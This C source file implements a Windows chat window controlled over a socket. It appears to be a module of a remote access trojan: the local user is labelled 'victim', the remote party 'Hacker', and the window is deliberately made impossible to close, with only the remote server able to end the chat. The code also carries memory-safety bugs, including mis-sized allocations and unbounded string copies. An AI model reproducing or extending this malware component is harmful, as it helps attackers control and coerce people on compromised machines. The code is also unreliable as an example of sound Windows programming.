#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <commctrl.h>
#include <strsafe.h>
#include <shlwapi.h>

#pragma comment(lib,"ws2_32.lib")

#define ID_EDIT   0x00000001
#define ID_BUTTON 0x00000002
#define IDC_LIST  0x00000003

SOCKET _s;



struct Message_s {

    wchar_t* message;
    wchar_t* name;
};



#include "_win_form.h"

/* START send chat */
#define _SEND_NEW_MESSAGE "client_new_message;"
/* END send chat */

/* START recv chat */
#define _RECV_NEW_MESSAGE "server_new_message;"
#define _END_CHAT "end_chat;"
/* END recv chat */

/* START CLOSE chat */
#define _CLOSE_CHAT "close_chat;"
/* END CLOSE chat */

static char* wchar_to_char(const wchar_t* pwchar);
DWORD CALLBACK recv_thread();
BOOL EXIT_WINDOW_SAFE = FALSE;
static HWND hwndEdit, hwndList;
HWND hwndButton;

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
 
    wchar_t buf[256];
    switch (msg) {

    case WM_CREATE:

        hwndList = CreateWindowW
        (
            WC_LISTBOXW,
            NULL,
            WS_CHILD | WS_VISIBLE | WS_VSCROLL | LBS_NOTIFY ,
            10,
            10,
            550,
            300,
            hwnd,
            (HMENU)IDC_LIST,
            NULL,
            NULL
        );

        hwndEdit = CreateWindowW
        (
            WC_EDITW,
            NULL,
            WS_CHILD | WS_VISIBLE | WS_BORDER,
            112,
            333,
            450,
            20,
            hwnd,
            (HMENU)ID_EDIT,
            NULL,
            NULL
        );
        hwndButton = CreateWindowW
        (
            WC_BUTTONW,
            L"Send",
            WS_VISIBLE | WS_CHILD,
            20,
            330,
            80,
            25,
            hwnd,
            (HMENU)ID_BUTTON,
            NULL,
            NULL
        );
        SetWindowTextW(hwnd, L"Chat with @@");
        break;
    case WM_COMMAND:



        if (HIWORD(wParam) == BN_CLICKED) {

            /* START insert message for client */
            struct Message_s message;
            int len = GetWindowTextLengthW(hwndEdit) + 1;
            wchar_t* text = calloc(len, sizeof(wchar_t*));
            GetWindowTextW(hwndEdit, text, len);
            message.message = text;
            message.name = L"victim";
            StringCbPrintfW(buf, ARRAYSIZE(buf), L"%ls: %ls", message.name, message.message);
            SendMessageW(hwndList, LB_ADDSTRING, 0, (LPARAM)buf);
            /* END insert message for client */

            /* START send message for srvr */

            char* char_message = wchar_to_char(message.message);
            char info_buffer[4096] = _SEND_NEW_MESSAGE;
            strcat(info_buffer, char_message);
            if (send(_s, info_buffer, strlen(info_buffer), 0) < 0)
            {
                break;
            }

            /* END send message for srvr */
            free(text);
            free(char_message);
        }
        break;

    case WM_DESTROY:
        {
            //NO THAT IS WILL NEVER HAPPEN IF I DON'T WANT IT!
            ExitThread(0);
        }
    }

    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

DWORD WINAPI show_chat_form(DATA* data) {
        DWORD ThreadID;
        _s = *data->s;
        MSG  msg;
        WNDCLASSW wc = { 0 };
        wc.lpszClassName = L"Chat";
        wc.hbrBackground = CreateSolidBrush(RGB(0, 0, 0));
        wc.hInstance = *data->hInstance;
        wc.hbrBackground = GetSysColorBrush(COLOR_3DFACE);
        wc.lpfnWndProc = WndProc;
        wc.hCursor = LoadCursor(0, IDC_ARROW);

        HANDLE hndl = CreateThread(NULL, 0, recv_thread, NULL, 0, &ThreadID);
        if (hndl) {
            RegisterClassW(&wc);
            CreateWindowW(wc.lpszClassName, L"Chat",
                WS_OVERLAPPEDWINDOW | WS_VISIBLE,
                220, 220, 600, 400, 0, 0, *data->hInstance, 0);

            while (GetMessage(&msg, NULL, 0, 0)) {
                if (!EXIT_WINDOW_SAFE) {
                    TranslateMessage(&msg);
                    DispatchMessage(&msg);
                }
                else {
                    EXIT_WINDOW_SAFE = FALSE;
                    ExitThread(1);
                }
            }
        }
        return 0;
}

wchar_t* charToWChar2(const char* text)
{
	wchar_t wszTo[1024];
	wszTo[strlen(text)] = L'\0';
	MultiByteToWideChar(CP_ACP, 0, text, -1, wszTo, (int)strlen(text));
	wchar_t* wchr = StrDupW(wszTo);
	return wchr;
}



DWORD CALLBACK recv_thread() {

    for (;;) {
        char* srvr_recv = calloc(2000, sizeof(char*));
        if ((recv(_s, srvr_recv, 2000, 0)) == SOCKET_ERROR)
        {
            break;
        }

        if (strstr(srvr_recv, _CLOSE_CHAT) != NULL) {
            break;
        }
        else if (strstr(srvr_recv, _RECV_NEW_MESSAGE) != NULL)
        {
            wchar_t buf[1024];
            struct Message_s message;
            char* _message = srvr_recv + strlen(_RECV_NEW_MESSAGE);
            message.name = L"Hacker";   //TODO: make it chagable use  
            message.message = charToWChar2(_message);
            StringCbPrintfW(buf, ARRAYSIZE(buf), L"%ls: %ls", message.name, message.message);
            SendMessageW(hwndList, LB_ADDSTRING, 0, (LPARAM)buf);
        }
        else if (strstr(srvr_recv, _END_CHAT) != NULL) {
            free(srvr_recv);
            break;
        }
        free(srvr_recv);

    }
    EXIT_WINDOW_SAFE = TRUE;
    ExitThread(0);
    return 0;
 
}

char* wchar_to_char(const wchar_t* pwchar)
{
    char szTo[4096];
    szTo[lstrlenW(pwchar)] = '\0';
    WideCharToMultiByte(CP_ACP, 0, pwchar, -1, szTo, (int)lstrlenW(pwchar), NULL, NULL);
    char* chr = _strdup(szTo);
    return chr;
}
